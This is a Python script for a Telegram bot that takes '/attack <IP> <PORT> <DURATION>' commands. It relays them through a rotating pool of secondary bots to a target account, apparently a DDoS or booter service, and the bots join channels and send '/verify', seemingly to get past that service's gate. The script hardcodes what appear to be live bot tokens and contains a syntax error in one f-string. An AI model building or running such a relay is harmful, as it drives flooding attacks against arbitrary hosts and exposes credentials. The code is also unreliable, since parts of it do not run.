import time
import threading
from telegram import Bot
from telegram.ext import Updater, CommandHandler, CallbackContext, Update

# Configuration (main bot and secondary bots tokens)
MAIN_BOT_TOKEN = '7753232073:AAElmKG_cDoui0BfdhoTr9COVbdg9rg663Y'  # Replace with the main bot token
BOT_TOKENS = [
    '7689914997:AAHT7onkIoXwndOQiDsuM0Z-ubfrYgEN3Ok', 'BOT_TOKEN_2', 'BOT_TOKEN_3', 'BOT_TOKEN_4', 'BOT_TOKEN_5',
    'BOT_TOKEN_6', 'BOT_TOKEN_7', 'BOT_TOKEN_8', 'BOT_TOKEN_9', 'BOT_TOKEN_10',
    'BOT_TOKEN_11', 'BOT_TOKEN_12', 'BOT_TOKEN_13', 'BOT_TOKEN_14', 'BOT_TOKEN_15'
]

CHANNELS = ['https://t.me/botchnl2n', 'https://t.me/botchnl1']  # Replace with your channel links

# Global variables to store bot states
bot_counter = 0
target_username = ""
ip_address = ""
port = 0
duration = 0

# Function to join channels and send /verify
def join_channels_and_verify(bot_token: str, target_username: str):
    bot = Bot(token=bot_token)
    for channel in CHANNELS:
        try:
            bot.join_chat(channel)
        except Exception as e:
            print(f"Error joining channel {channel}: {e}")
    bot.send_message(chat_id=target_username, text='/verify')

# Handler for /attack command
def attack(update: Update, context: CallbackContext):
    global target_username, ip_address, port, duration

    # Extract attack details from the command
    message = update.message.text
    args = message.split()

    if len(args) != 4:
        update.message.reply_text('Usage: /attack <IP> <PORT> <DURATION> (Max 90 seconds)')
        return

    ip_address = args[1]
    port = int(args[2])
    duration = int(args[3])
    
    if duration > 90:
        update.message.reply_text('Max time allowed is 90 seconds.')
        return
    
    target_username = update.message.from_user.username  # Or use the actual target username (@username)
    
    update.message.reply_text(f'Attack started on {@Hsisnsnnvm} with IP: {ip_address}, Port: {port}, Duration: {duration}s')

    # Run the bots to perform the attack
    threading.Thread(target=run_bots).start()

# Function to run 15 bots, each sending one message
def run_bots():
    global bot_counter
    for i in range(duration):
        # Select the bot for sending the message
        bot_token = BOT_TOKENS[bot_counter]
        bot = Bot(token=bot_token)
        
        # Send attack message
        bot.send_message(chat_id=f"@{target_username}", text=f'/attack {ip_address} {port} {duration - i}')
        
        # Join channels and send /verify (only once for each bot)
        if i == 0:  # Join channels only at the start of the attack
            join_channels_and_verify(bot_token, f"@{target_username}")
        
        # Sleep for 1 second between sending messages
        time.sleep(1)
        
        # Move to the next bot
        bot_counter = (bot_counter + 1) % len(BOT_TOKENS)

    # After 90 seconds, send "I am done" message
    bot = Bot(token=BOT_TOKENS[bot_counter])
    bot.send_message(chat_id=f"@{target_username}", text='I am done.')

# Start the main bot
def start(update: Update, context: CallbackContext):
    update.message.reply_text('Welcome! Use /attack to start.')

def main():
    # Set up the main bot
    updater = Updater(MAIN_BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("attack", attack))
    
    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
